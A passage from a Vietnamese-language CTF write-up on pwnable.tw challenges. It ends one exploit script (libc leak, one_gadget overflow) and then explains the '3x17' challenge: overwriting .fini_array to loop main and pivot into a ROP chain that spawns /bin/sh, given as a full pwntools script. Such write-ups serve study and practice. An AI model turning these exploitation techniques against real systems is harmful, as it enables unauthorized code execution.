print(passowrd.hex())

log_out()

p.sendlineafter(b'>> ',b'1')
p.sendafter(b'passowrd :',b'\x00' + b'b'*71)

p.sendlineafter(b'>> ',b'3')
p.sendafter(b'Copy :',b'a'*8)


libc_leak = bf_libc()
libc_leak = u64(libc_leak[8:].ljust(8,b'\x00'))
print(type(libc_leak))
log.info(f'libc: {hex(libc_leak)}')
libc.address = libc_leak - 0x78439
log.info(f'libc_address: {hex(libc.address)}')
one_gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
oneshot = libc.address + one_gadget[0]
log_out()
payload = flat(
        'a'*0x40,
        passowrd,
        'b'*0x18,
        oneshot
        )
p.sendlineafter(b'>>',b'1')
p.sendafter(b'passowrd :',payload)

log_in()
p.sendlineafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a')

p.sendlineafter(b'>>',b'2')


p.interactive()
```


## 3x17


- vì file bị stripped nên nhìn khá nhức đầu 

![image](/assets/images/Pwnable.tw/43.png)

đây là 1 bài nói về kĩ thuật .fini_array , trước hết ta cần đọc cái https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html này để hiểu về nó

tóm tắt như sau : 

khi 1 chương trình C được khởi động về cơ bản nó hoạt động như sau : 

_start sẽ gọi __libc_start_main và đây là hàm sẽ gọi main() , nó sẽ gồm những đối số sau : 

![image](/assets/images/Pwnable.tw/44.png)

- giải thích về chúng 

![image](/assets/images/Pwnable.tw/45.png)


nói đơn giản , .fini_array là 1 địa chỉ của hàm hủy khi chương trình kết thúc , vậy nếu ta có thể overwrite nó thành cái gì đó , ta hoàn toàn có thể điều khiển luồng thực thi của chương trình


hàm  ```sub_401B6D``` : ta thấy ta được nhập 1 địa chỉ và nhập dữ liệu vào địa chỉ đó

```c
__int64 sub_401B6D()
{
  __int64 result; // rax
  char *v1; // [rsp+8h] [rbp-28h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  result = (unsigned __int8)++byte_4B9330;
  if ( byte_4B9330 == 1 )
  {
    sub_446EC0(1u, "addr:", 5uLL);
    sub_446E20(0, buf, 0x18uLL);
    v1 = (char *)(int)sub_40EE70(buf);
    sub_446EC0(1u, "data:", 5uLL);
    sub_446E20(0, v1, 0x18uLL);
    result = 0LL;
  }
  if ( __readfsqword(0x28u) != v3 )
    sub_44A3E0();
  return result;
}
```

- vậy trước hết ta cần tìm ra địa chỉ .fini_array , từ hình trên ta có thể hình dung ra được 

```_start, __libc_start_main(main,argc,argv&env,init,fini,rtld_fini```

![image](/assets/images/Pwnable.tw/46.png)


vậy fini sẽ là ```sub_402960``` 

Có thể thấy rằng:
```
__libc_csu_init thực thi .init và .init_array
__libc_csu_fini thực thi .fini và .fini_array
```

Và thứ tự thực hiện như sau:

__libc_csu_init
main
__libc_csu_fini

chi tiết hơn như sau : 
```
.init
.init_array[0]
.init_array[1]
…
.init_array[n]
main
.fini_array[n]
…
.fini_array[1]
.fini_array[0]
.fini
```


```__libc_csu_fini```

```
```c
.text:0000000000402960 sub_402960      proc near               ; DATA XREF: start+F↑o
.text:0000000000402960 ; __unwind {
.text:0000000000402960                 push    rbp
.text:0000000000402961                 lea     rax, unk_4B4100
.text:0000000000402968                 lea     rbp, off_4B40F0 ; fini_array
.text:000000000040296F                 push    rbx
.text:0000000000402970                 sub     rax, rbp
.text:0000000000402973                 sub     rsp, 8
.text:0000000000402977                 sar     rax, 3
.text:000000000040297B                 jz      short loc_402996
.text:000000000040297D                 lea     rbx, [rax-1]
.text:0000000000402981                 nop     dword ptr [rax+00000000h]
.text:0000000000402988
.text:0000000000402988 loc_402988:                             ; CODE XREF: sub_402960+34↓j
.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0] ; 调用fini_array的函数
.text:000000000040298C                 sub     rbx, 1
.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh
.text:0000000000402994                 jnz     short loc_402988
.text:0000000000402996
.text:0000000000402996 loc_402996:                             ; CODE XREF: sub_402960+1B↑j
.text:0000000000402996                 add     rsp, 8
.text:000000000040299A                 pop     rbx
.text:000000000040299B                 pop     rbp
.text:000000000040299C                 jmp     sub_48E32C
.text:000000000040299C ; } // starts at 402960
.text:000000000040299C sub_402960      endp
```

- ta cũng có thể xem mã nguồn libc https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/csu/elf-init.c

```c
__libc_csu_fini (void)
{
#ifndef LIBC_NONSHARED
  size_t i = __fini_array_end - __fini_array_start;
  while (i-- > 0)
    (*__fini_array_start [i]) ();

# ifndef NO_INITFINI
  _fini ();
# endif
#endif
}
```

sơ đồ 

```c
+---------------------+             +---------------------+              +---------------------+             +---------------------+
|                     |             |                     |              |                     |             |                     |
|       main          |  +--------> |  __libc_csu_fini    |  +------->   |  .fini_array[1]     |  +------->  |   .fini_array[0]    |
|                     |             |                     |              |                     |             |                     |
+---------------------+             +---------------------+              +---------------------+             +---------------------+

```

ta sẽ thay đổi luồng thực thi như thế này 

```c
+---------------------+             +---------------------+              +---------------------+             +---------------------+
|                     |             |                     |              |                     |             |                     |
|       main          |  +--------> |  __libc_csu_fini    |  +------->   |  .fini_array[1]     |             |   .fini_array[0]    |
|                     |             |                     |              |  __libc_csu_fini    |             |   main              |
+---------------------+             +---------------------+              +---------------------+             +---------------------+

                                                                                ^          +
                                                                                |          |
                                                                                +----------+
```
tuy nhiên trong bài này có 1 biến toàn cục ```byte_4B9330``` giá trị của nó sẽ luôn tăng (0-256) , vậy tóm tắt flow chương trình sẽ như sau : 

main -> fini -> main ( .fini_array[1]) -> fini ( .fini_array[0]) , từ đây nó sẽ loop và ta có thể nhập được cho các lần sau 

- vậy ý tưởng cuối cùng là build 1 rop_chain , build xong thì dùng ```leave_ret``` vô ```.fini_array[0]``` và đơn giản là nó sẽ nhảy vô chuỗi ```ROP``` của ta ```0x4b4100```

script 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./3x17')

p = process()
"""
gdb.attach(p,gdbscript='''
           b*0x0000000000401C4C
           b*0x0000000000401B9B
           ''')
"""
esp = 0x4B4100
leave_ret = 0x401C4B
fini_array = 0x4B40F0
main_addr = 0x401B6D
libc_csu_fini = 0x402960
pop_rdx =0x0000000000446e35
pop_rsi = 0x0000000000406c30
pop_rdi = 0x0000000000401696
pop_rax = 0x000000000041e4af
syscall = 0x0000000000471db5
def write(addr,data):
        p.recv()
        p.send(str(addr))
        p.recv()
        p.send(data)

input()
write(fini_array,p64(libc_csu_fini)+p64(main_addr))
write(fini_array+ 2*8,p64(pop_rdi) + p64(fini_array+ 11*8))
write(fini_array+ 4*8,p64(pop_rax) + p64(0x3b))
write(fini_array+ 6*8,p64(pop_rsi) + p64(0))
write(fini_array+ 8*8,p64(pop_rdx) + p64(0))
write(fini_array+ 10*8,p64(syscall) + b'/bin/sh\x00')
write(fini_array,p64(leave_ret))

p.interactive()
```

![image](https://hackmd.io/_uploads/BJEFHC1K1x.png)
